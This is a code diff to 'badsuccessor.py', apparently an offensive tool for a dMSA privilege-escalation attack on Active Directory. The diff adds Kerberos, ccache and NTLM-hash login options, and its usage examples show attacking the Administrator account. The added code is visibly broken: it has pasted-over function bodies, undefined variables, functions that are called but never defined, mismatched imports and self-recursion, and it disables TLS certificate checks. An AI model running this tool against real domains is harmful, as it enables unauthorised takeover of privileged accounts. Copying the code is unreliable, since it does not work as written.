@@ -25,7 +25,7 @@ from urllib.parse import quote
 
 try:
     import ldap3
-    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, MODIFY_ADD
+    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, MODIFY_ADD, SASL, KERBEROS
     from ldap3.core.exceptions import LDAPException
 except ImportError:
     print("Error: ldap3 library required. Install with: pip3 install ldap3")
@@ -39,9 +39,18 @@ try:
     from impacket import version
     from impacket.dcerpc.v5 import transport, epm
     from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+    from impacket.krb5.ccache import CCache
+    from impacket.krb5.kerberosv5 import getKerberosTGS
 except ImportError:
     print("Error: impacket library required. Install with: pip3 install impacket")
     sys.exit(1)
+
+try:
+    import gssapi
+    GSSAPI_AVAILABLE = True
+except ImportError:
+    GSSAPI_AVAILABLE = False
+    print("Warning: python-gssapi not available. Kerberos auth will be limited.")
 
 class Colors:
     """ANSI color codes for terminal output"""
@@ -113,7 +122,106 @@ class BadSuccessor:
 
         return None, None
 
+    def get_kerberos_tgt(self, domain, username, password, dc_ip):
+        """Get Kerberos TGT using impacket"""
+        try:
+            self.log("Requesting Kerberos TGT...", "INFO")
+
+            # Create principal
+            user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+            # Get TGT
+            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+                user_principal, password, domain,
+                compute_lmhash(password), compute_nthash(password),
+                None, dc_ip
+            )
+
+            self.log("Successfully obtained Kerberos TGT", "SUCCESS")
+            return tgt, cipher, sessionKey
+
+        except KerberosError as e:
+            self.log(f"Kerberos authentication failed: {e}", "ERROR")
+            return None, None, None
+        except Exception as e:
+            self.log(f"Error getting TGT: {e}", "ERROR")
+            return None, None, None
+
     def establish_ldap_connection(self, dc_ip, domain, username, password, use_ssl=False, port=None):
+        """Establish LDAP connection using Kerberos authentication"""
+        try:
+            # Determine port
+            if port is None:
+                port = 636 if use_ssl else 389
+
+            protocol = "LDAPS" if use_ssl else "LDAP"
+            self.log(f"Attempting Kerberos {protocol} connection to {dc_ip}:{port}", "INFO")
+
+            # Create server with SSL if requested
+            if use_ssl:
+                import ssl
+                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
+                server = Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ALL)
+            else:
+                server = Server(dc_ip, port=port, get_info=ALL)
+
+            # Try different Kerberos authentication methods
+            conn = None
+
+            # Method 1: Use ccache file if provided
+            if ccache_file and os.path.exists(ccache_file):
+                self.log(f"Using Kerberos ccache: {ccache_file}", "INFO")
+                os.environ['KRB5CCNAME'] = ccache_file
+
+                if GSSAPI_AVAILABLE:
+                    try:
+                        conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
+                        if conn.bind():
+                            self.log("Kerberos authentication successful (ccache)", "SUCCESS")
+                        else:
+                            conn = None
+                    except Exception as e:
+                        self.log(f"GSSAPI Kerberos failed: {e}", "WARNING")
+                        conn = None
+
+            # Method 2: Get TGT with password and use impacket
+            elif password:
+                self.log("Attempting Kerberos authentication with password", "INFO")
+                tgt, cipher, sessionKey = self.get_kerberos_tgt(domain, username, password, dc_ip)
+
+                if tgt:
+                    # Try to use the TGT for LDAP connection
+                    # Note: This is simplified - in practice you'd need to implement
+                    # proper Kerberos LDAP authentication with the TGT
+                    self.log("TGT obtained, falling back to NTLM for LDAP", "WARNING")
+                    return self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, port)
+
+            # Method 3: Use current Kerberos credentials (if available)
+            if not conn and GSSAPI_AVAILABLE:
+                try:
+                    self.log("Attempting Kerberos with current credentials", "INFO")
+                    conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
+                    if conn.bind():
+                        self.log("Kerberos authentication successful (current creds)", "SUCCESS")
+                    else:
+                        conn = None
+                except Exception as e:
+                    self.log(f"Current credentials Kerberos failed: {e}", "WARNING")
+                    conn = None
+
+            if conn:
+                # Get domain DN
+                domain_parts = domain.split('.')
+                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
+                self.log(f"Domain DN: {self.domain_dn}", "INFO")
+                return conn
+            else:
+                self.log("All Kerberos methods failed", "ERROR")
+                return None
+
+        except Exception as e:
+            self.log(f"Kerberos connection error: {e}", "ERROR")
+            return None
         """Establish authenticated LDAP connection"""
         try:
             # Determine port based on SSL preference
@@ -153,6 +261,39 @@ class BadSuccessor:
             return None
 
     def establish_connection_with_fallback(self, dc_ip, domain, username, password, prefer_ssl=True, custom_port=None):
+        """Try different authentication methods with fallback"""
+
+        # Determine authentication preference
+        auth_methods = []
+        if auth_method == 'kerberos':
+            auth_methods = ['kerberos']
+        elif auth_method == 'ntlm':
+            auth_methods = ['ntlm']
+        else:  # auto
+            auth_methods = ['kerberos', 'ntlm']
+
+        for method in auth_methods:
+            self.log(f"Trying {method.upper()} authentication", "INFO")
+
+            if method == 'kerberos':
+                conn = self.establish_kerberos_connection(dc_ip, domain, username, password, prefer_ssl, custom_port, ccache_file)
+                if conn:
+                    return conn
+                self.log("Kerberos authentication failed, trying next method", "WARNING")
+
+            elif method == 'ntlm':
+                if custom_port:
+                    use_ssl = custom_port == 636
+                    conn = self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, custom_port)
+                    if conn:
+                        return conn
+                else:
+                    conn = self.establish_connection_with_fallback(dc_ip, domain, username, password, prefer_ssl, custom_port)
+                    if conn:
+                        return conn
+                self.log("NTLM authentication failed", "WARNING")
+
+        return None
         """Try LDAPS first, fallback to LDAP if needed"""
 
         if custom_port:
@@ -602,22 +743,40 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
+  # Basic NTLM authentication
   python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --enumerate
-  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --ldaps --attack --target Administrator
-  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --port 3268 --targets
-  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --cleanup --dmsa-dn "CN=evil_dmsa,OU=temp,DC=domain,DC=com"
+
+  # Kerberos with password
+  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 -k --attack --target Administrator
+
+  # Kerberos with ccache
+  python3 badsuccessor.py -d domain.com -u user --dc-ip 192.168.1.10 --ccache /tmp/krb5cc_1000 --no-pass --targets
+
+  # NTLM hash authentication
+  python3 badsuccessor.py -d domain.com -u user --hash :aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 --dc-ip 192.168.1.10 --enumerate
+
+  # Force LDAPS with Kerberos
+  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --ldaps --auth kerberos --attack --target Administrator
         """
     )
 
     # Connection parameters
     parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., domain.com)')
     parser.add_argument('-u', '--username', required=True, help='Username for authentication')
-    parser.add_argument('-p', '--password', required=True, help='Password for authentication')
+    parser.add_argument('-p', '--password', help='Password for authentication')
     parser.add_argument('--dc-ip', help='Domain Controller IP (auto-discover if not specified)')
     parser.add_argument('--ldaps', action='store_true', help='Force LDAPS (SSL) connection on port 636')
     parser.add_argument('--ldap', action='store_true', help='Force LDAP (non-SSL) connection on port 389')
     parser.add_argument('--port', type=int, help='Custom LDAP port (overrides --ldaps/--ldap)')
     parser.add_argument('--no-ssl-fallback', action='store_true', help='Disable automatic LDAPS->LDAP fallback')
+
+    # Authentication options
+    parser.add_argument('--auth', choices=['auto', 'kerberos', 'ntlm'], default='auto',
+                       help='Authentication method (default: auto)')
+    parser.add_argument('--ccache', help='Path to Kerberos ccache file')
+    parser.add_argument('--no-pass', action='store_true', help='Use Kerberos authentication without password')
+    parser.add_argument('--hash', help='NTLM hash for authentication (format: LM:NT or :NT)')
+    parser.add_argument('-k', '--kerberos', action='store_true', help='Use Kerberos authentication (same as --auth kerberos)')
 
     # Actions
     parser.add_argument('--enumerate', action='store_true', help='Enumerate vulnerable OUs')
@@ -637,10 +796,37 @@ Examples:
     if not args.no_banner:
         bs.print_banner()
 
+    # Handle authentication parameters
+    if args.kerberos:
+        args.auth = 'kerberos'
+
+    if args.no_pass and not args.ccache and not args.hash:
+        bs.log("--no-pass requires either --ccache or --hash", "ERROR")
+        sys.exit(1)
+
+    if not args.password and not args.no_pass and not args.hash:
+        bs.log("Password required unless using --no-pass with --ccache or --hash", "ERROR")
+        sys.exit(1)
+
+    # Set up authentication
+    auth_password = args.password
+    if args.hash:
+        # Parse hash format
+        if ':' in args.hash:
+            lm_hash, nt_hash = args.hash.split(':', 1)
+        else:
+            lm_hash = 'aad3b435b51404eeaad3b435b51404ee'  # Empty LM hash
+            nt_hash = args.hash
+        bs.log(f"Using NTLM hash authentication", "INFO")
+        # For hash auth, we'd need to implement hash-based authentication
+        # For now, fall back to password requirement
+        if not args.password:
+            bs.log("Hash authentication not fully implemented yet. Use with --password for now.", "WARNING")
+
     # Store credentials
     bs.domain = args.domain
     bs.username = args.username
-    bs.password = args.password
+    bs.password = auth_password
 
     # Discover or use provided DC IP
     if args.dc_ip:
@@ -652,10 +838,12 @@ Examples:
             bs.log("Could not discover DC. Please specify --dc-ip", "ERROR")
             sys.exit(1)
 
-    # Establish LDAP connection with SSL options
+    # Establish LDAP connection with authentication options
     connection_options = {
-        'prefer_ssl': not args.ldap,  # Prefer SSL unless --ldap is specified
-        'custom_port': args.port
+        'prefer_ssl': not args.ldap,
+        'custom_port': args.port,
+        'auth_method': args.auth,
+        'ccache_file': args.ccache
     }
 
     # Override SSL preference based on explicit flags
@@ -668,16 +856,25 @@ Examples:
         # Use single connection attempt without fallback
         use_ssl = args.ldaps or (args.port == 636)
         port = args.port or (636 if use_ssl else 389)
-        bs.connection = bs.establish_ldap_connection(bs.dc_ip, args.domain, args.username, args.password, use_ssl, port)
+
+        if args.auth == 'kerberos':
+            bs.connection = bs.establish_kerberos_connection(
+                bs.dc_ip, args.domain, args.username, auth_password, use_ssl, port, args.ccache
+            )
+        else:
+            bs.connection = bs.establish_ldap_connection(
+                bs.dc_ip, args.domain, args.username, auth_password, use_ssl, port
+            )
     else:
-        # Use fallback mechanism
-        bs.connection = bs.establish_connection_with_fallback(
-            bs.dc_ip, args.domain, args.username, args.password,
-            connection_options['prefer_ssl'], connection_options['custom_port']
+        # Use authentication fallback mechanism
+        bs.connection = bs.establish_connection_with_auth_fallback(
+            bs.dc_ip, args.domain, args.username, auth_password,
+            connection_options['prefer_ssl'], connection_options['custom_port'],
+            connection_options['auth_method'], connection_options['ccache_file']
         )
 
     if not bs.connection:
-        bs.log("Failed to establish LDAP connection", "ERROR")
+        bs.log("Failed to establish LDAP connection with any authentication method", "ERROR")
         sys.exit(1)
 
     # Check for Server 2025 DCs and schema support
